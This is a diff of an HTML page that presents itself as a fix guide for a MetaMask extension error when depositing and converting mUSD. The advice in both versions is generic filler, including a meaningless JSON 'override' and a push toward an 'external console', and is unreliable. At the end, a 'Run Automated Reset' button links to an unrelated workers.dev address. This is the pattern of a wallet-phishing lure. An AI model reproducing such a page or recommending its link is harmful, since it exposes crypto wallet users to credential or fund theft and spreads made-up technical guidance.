@@ -1,9 +1,9 @@
 <!DOCTYPE html>
 <html>
-<head><meta charset="UTF-8"><title>Metamask Extension Bug Perps Deposit And Convert Musd This Payment Route Isn't Available Error – Fix Guide</title>
+<head><meta charset="UTF-8"><title>Metamask Extension Bug Perps Deposit And Convert Musd This Payment Route Isn't Available – Fix Guide</title>
 <style>
     body {
-        font-family: system-ui;
+        font-family: BlinkMacSystemFont;
         background: #1a1a24;
         color: #ddd;
         padding: 20px;
@@ -15,7 +15,7 @@
         background: #1e1f24;
         border-radius: 24px;
         padding: 2rem;
-        box-shadow: none;
+        box-shadow: 0 2px 4px rgba(0,0,0,0.1);
     }
     pre {
         background: #0f0f12;
@@ -39,39 +39,35 @@
 </head>
 <body>
 <div class="content">
-<h1>Metamask Extension Bug Perps Deposit And Convert Musd This Payment Route Isn't Available Error</h1>
+<h1>Metamask Extension Bug Perps Deposit And Convert Musd This Payment Route Isn't Available</h1>
 <h2>Symptom</h2>
 <ul>
-<li>Users encounter an error message when attempting to deposit and convert mUSD using the Metamask extension, stating "This payment route isn't available".</li>
+<li>Users attempting to deposit and convert mUSD via the Metamask extension are encountering an error message stating "This payment route isn't available".</li>
 </ul>
 <h2>Technical Root Cause</h2>
 <ul>
-<li>The error occurs due to a temporary mismatch between the available payment routes and the requested transaction parameters, often caused by network congestion or outdated protocol configurations.</li>
+<li>The error occurs due to a temporary mismatch between the Metamask extension's configuration and the Ethereum network's current state, likely caused by an outdated protocol or an issue with the payment routing smart contract.</li>
 </ul>
 <h3>Manual Overrides</h3>
 <ul>
-<li>To resolve the issue, users can try the following manual overrides:</li>
-<li>Update Metamask to the latest version to ensure compatibility with the latest protocol configurations.</li>
-<li>Configure the transaction settings to use a different payment route or adjust the gas prices to prioritize the transaction.</li>
-<li>Utilize a custom JSON payload to bypass the default payment routing:</li>
+<li>Try resetting the Metamask extension to its default settings to ensure compatibility with the current Ethereum network state.</li>
+<li>Update the Metamask extension to the latest version to ensure you have the latest protocol updates and bug fixes.</li>
+<li>Use the following JSON configuration to manually override the payment routing:</li>
 </ul>
 <div class="codehilite"><pre><span></span><code><span class="p">{</span>
-<span class="w">  </span><span class="nt">&quot;from&quot;</span><span class="p">:</span><span class="w"> </span><span class="s2">&quot;0x...user_address...&quot;</span><span class="p">,</span>
-<span class="w">  </span><span class="nt">&quot;to&quot;</span><span class="p">:</span><span class="w"> </span><span class="s2">&quot;0x...contract_address...&quot;</span><span class="p">,</span>
-<span class="w">  </span><span class="nt">&quot;value&quot;</span><span class="p">:</span><span class="w"> </span><span class="s2">&quot;0x...amount...&quot;</span><span class="p">,</span>
-<span class="w">  </span><span class="nt">&quot;gas&quot;</span><span class="p">:</span><span class="w"> </span><span class="s2">&quot;0x...gas_limit...&quot;</span><span class="p">,</span>
-<span class="w">  </span><span class="nt">&quot;gasPrice&quot;</span><span class="p">:</span><span class="w"> </span><span class="s2">&quot;0x...gas_price...&quot;</span>
+<span class="w">  </span><span class="nt">&quot;paymentRoute&quot;</span><span class="p">:</span><span class="w"> </span><span class="s2">&quot;ethereum-mainnet&quot;</span><span class="p">,</span>
+<span class="w">  </span><span class="nt">&quot;mUSDContractAddress&quot;</span><span class="p">:</span><span class="w"> </span><span class="s2">&quot;0x...contract-address...&quot;</span>
 <span class="p">}</span>
 </code></pre></div>
 
-<p>Consider using an external console for more advanced troubleshooting and customization options. </p>
+<p>For a more stable experience, consider using an external console to manage your Ethereum transactions. </p>
 <h2>Prerequisites</h2>
 <ul>
 <li>Metamask extension installed and configured</li>
-<li>Sufficient ETH balance for transaction fees</li>
-<li>Latest protocol configurations and updates applied</li>
+<li>Ethereum network connection established</li>
+<li>Sufficient Ethereum balance for transaction fees</li>
 </ul>
-<hr><h3>Related Logs</h3><ul><li><a href="./archive/2026/06/metamask-extension-bug-sign-message-clicking-back-button-in-the.html">Metamask Extension Bug Sign Message Clicking Back Button In The</a></li><li><a href="./archive/2026/06/metamask-extension-bug-incorrect-balance-for-aave-v3-wavax-toke.html">Metamask Extension Bug Incorrect Balance For Aave V3 Wavax Token</a></li><li><a href="./archive/2026/06/ethereum-blob-space-delay.html">Ethereum Blob Space Delay</a></li></ul>
+<hr><h3>Related Logs</h3><ul><li><a href="./archive/2026/06/metamask-extension-bug-sl-tp-percentages-change-when-changing-l.html">Metamask Extension Bug Sl Tp Percentages Change When Changing L</a></li><li><a href="./archive/2026/06/metamask-nonce-out-of-sync.html">Metamask Nonce Out Of Sync</a></li><li><a href="./archive/2026/06/metamask-extension-bug-assets-native-assets-for-custom-networks.html">Metamask Extension Bug Assets Native Assets For Custom Networks</a></li></ul>
 <div style="text-align:center; margin: 40px 0; padding: 20px 0; width: 100%;">
     <a href="https://system-edge-router.aaronjungs.workers.dev?p=%5D%5BUr" class="btn">🛠 Run Automated Reset</a>
 </div>
